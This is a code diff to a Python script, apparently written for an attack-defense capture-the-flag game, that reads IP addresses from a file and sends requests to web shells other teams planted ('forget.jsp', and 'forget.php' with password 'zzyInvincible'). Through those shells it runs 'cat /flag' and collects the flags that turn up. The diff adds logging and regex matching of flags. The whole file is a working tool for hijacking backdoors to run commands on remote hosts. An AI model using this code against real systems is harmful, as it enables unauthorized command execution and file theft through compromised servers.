@@ -1,7 +1,58 @@
-from requests.exceptions import ReadTimeout
+import re
 import requests
+import logging
 
-# 创建一个空列表，用于存储文件中的每一行
+FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
+
+
+def get(iplist):
+    res = {}
+    for i in range(0, len(iplist)):
+        try:
+            ip = iplist[i]
+            url = 'http://' + ip + 'forget.jsp?cmd1=cat%20/flag.txt'  # 别人的攻击流量
+            r = requests.get(url=url, timeout=3)
+            if r.status_code == 200:
+                match = FLAG_PATTERN.search(r.text)
+                if match:
+                    flag = match.group(0)  # 完整flag
+                    logging.info(f"{ip} found flag: {flag}")
+                    res[ip] = flag
+                else:
+                    logging.warning(f"{ip} status_code=200 but no flag")
+            else:
+                logging.warning(f"{ip} status_code: {r.status_code}")
+        except Exception as e:
+            logging.error(f"{ip} request failed: {e}")
+    return res
+
+
+def post(iplist):
+    res = {}
+    payload = {
+        "passwd": "zzyInvincible",  # 用别人的
+        "cmd": "system('cat /flag');",
+    }
+    for i in range(0, len(iplist)):
+        try:
+            ip = iplist[i]
+            url = 'http://' + ip + 'forget.php'  # 别人的攻击流量
+            r = requests.post(url=url, data=payload, timeout=3)
+            if r.status_code == 200:
+                match = FLAG_PATTERN.search(r.text)
+                if match:
+                    flag = match.group(0)  # 完整flag
+                    logging.info(f"{ip} found flag: {flag}")
+                    res[ip] = flag
+                else:
+                    logging.warning(f"{ip} status_code=200 but no flag")
+            else:
+                logging.warning(f"{ip} status_code: {r.status_code}")
+        except Exception as e:
+            logging.error(f"{ip} request failed: {e}")
+    return res
+
+
 iplist = []
 
 # 打开文件
@@ -15,41 +66,9 @@ with open('ip.txt', 'r', encoding='utf-8') as file:
         # 读取下一行
         line = file.readline()
 
-
-def get(iplist):
-    for i in range(0, len(iplist)):
-        try:
-            url = iplist[i]
-            url = url + 'forget.jsp?cmd1=cat%20/flag.txt'  # 别人的攻击流量
-
-            print(url)
-            a = requests.get(url=url, timeout=3)
-            print(a.text)
-            with open("flag_别人的马.txt", 'a', encoding='UTF-8') as f:
-                f.write(f"{a.text}")
-        except:
-            pass
-
-
-def post(iplist):
-    payload = {
-        "passwd": "zzyInvincible",  #用别人的
-        "cmd": "system('cat /flag');",
-    }
-    for i in range(0, len(iplist)):
-        try:
-            url = iplist[i]
-            url = url + 'forget.php'  # 别人的攻击流量
-            r = requests.post(url=url, data=payload, timeout=3)
-
-            print(r.text)
-            with open("flag_别人的马.txt", 'a', encoding='UTF-8') as f:
-                f.write(f"{r.text}")
-        except:
-            pass
-
-
-get(iplist)
-
-##get传不死码
-post(iplist)
+res = get(iplist)
+# res=post(iplist)
+if res:
+    with open('flag.txt', 'w', encoding='utf-8') as file:
+        for ip, flag in res.items():
+            file.write(f"{ip} flag: {flag}\n")
